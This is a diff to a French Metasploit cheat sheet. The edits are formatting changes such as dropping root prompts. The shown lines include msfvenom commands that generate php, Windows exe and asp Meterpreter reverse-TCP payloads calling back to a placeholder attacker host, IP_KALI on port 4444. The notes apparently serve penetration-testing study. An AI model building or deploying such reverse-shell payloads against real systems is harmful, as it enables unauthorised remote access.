@@ -1,5 +1,4 @@
-metasploit
-==========
+# metasploit
 
 ## Commandes de base
 
@@ -41,8 +40,8 @@ dans *metasploit*.
 Il faut d'abord lancer *PostgreSQL* puis initialiser la base de données
 pour *metasploit* :
 ```
-# systemctl start postgresql
-# msfdb init
+sudo systemctl start postgresql
+msfdb init
 ```
 
 Cela crée une base de données `msf` et un utilisateur `msf`.
@@ -191,19 +190,19 @@ msf auxiliary(ssh_login) > sessions -u 1
 
 Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 :
 ```
-# msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw > payload.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw > payload.php
 ```
 
 ### windows exe (meterpreter)
 
 ```
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe
 ```
 
 ### windows asp (meterpreter)
 
 ```
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f asp > shell.asp
 ```
 
 ## Sources
